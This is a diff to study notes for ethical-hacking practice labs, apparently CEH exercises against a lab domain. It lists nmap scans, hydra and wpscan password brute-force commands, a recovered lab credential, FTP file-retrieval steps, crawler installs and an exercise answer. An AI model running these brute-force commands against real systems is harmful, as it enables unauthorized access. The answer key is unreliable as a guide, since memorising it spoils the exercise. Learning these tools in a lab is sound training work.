@@ -372,10 +372,14 @@ You are part of a cybersecurity team investigating an internal website that has 
 ***nmap for OS fingerprinting -A  (sudo nmap -T5 -A ip)
 - hydra -L user.txt -P rockyou.txt 192.168.10.144 ftp
 - username: Parker and Password: Passw0rd@1234
+*** ftp USERNAME@IP
+*** then enter password
+*** locate file and then "get filename.ext"
+*** if file is corrupted, during ftp sesssion type "binary" which should show 200 type set to I" then type passive and repeat above
 - Access ftp and get w_report.txt
 - open the report and read the site address
 - Scan that website with Smart Scanner takes upto 30 min
-- Scroll results to see Directory Listing of Sensitive Files.
+- Scroll results to see Directory Listing of *****Sensitive Files******.
 - It shows 37 Approx but the answer is +/-1
 
 Answer: 36
@@ -386,12 +390,16 @@ Perform a bruteforce attack on www.cehorg.com and find the password of user adam
 ***tried to spider/crawl but could not organically get the wp-login.php landing) but the followingg are just good notes***
 you can "dirb http://www.cehorg.com:8080" (:8080 is just common knowledge)
 check for other wordlists* - ls /usr/share/wordlists/
-****Katana directions: 
+
+****Katana (spider) directions: 
 sudo apt update
 sudo apt install golang-go -y
 go install github.com/projectdiscovery/katana/cmd/katana@latest
 export PATH=$PATH:$(go env GOPATH)/bin
 katana -u http://www.cehorg.com:8080 -d 3
+
+***gospider directions:
+sudo apt install gospider
 
 - wpscan --url http://www.cehorg.com:8080/CEH/wp-login.php -U adam -P password.txt
 (wp-login.php is just common knowledge)
